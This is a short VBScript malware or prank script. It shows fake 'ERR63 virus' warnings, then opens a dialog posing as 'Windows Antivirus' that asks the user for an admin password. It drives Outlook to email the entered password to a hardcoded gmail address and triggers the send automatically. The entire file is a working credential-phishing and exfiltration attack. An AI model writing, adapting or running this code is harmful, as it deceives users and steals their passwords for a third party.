  Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "outlook.exe", 9


x=msgbox("Your computer has been fucked by the ERR63 virus :)", 16, "ERR63 Message!")
x=msgbox("You cannot escape :)", 16, "ERR63 Message!")

i = inputbox("Please Enter Admin Password To Delete The Virus :", "Windows Antivirus")
f = msgbox("Failed To Delete Virus Using Admin Password "&i,5,"Windows Antivirus")

 Set objOutlook = CreateObject("Outlook.Application")
   Set objMail = objOutlook.CreateItem(0)
   objMail.Display   'To display message
   objMail.Recipients.Add ("river.m.phoenix@gmail.com")
   objMail.Subject = "Automated message for recieved user admin password input."
   objMail.Body = ("Admin password: "&i)
   'objMail.Attachments.Add("C:\Attachment\abc.jpg")   'Make sure attachment exists at given path. Then uncomment this line.
   objMail.Send   'I intentionally commented this line

  Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "outlook.exe", 9

WScript.Sleep 3000 

WshShell.SendKeys "{F9}"
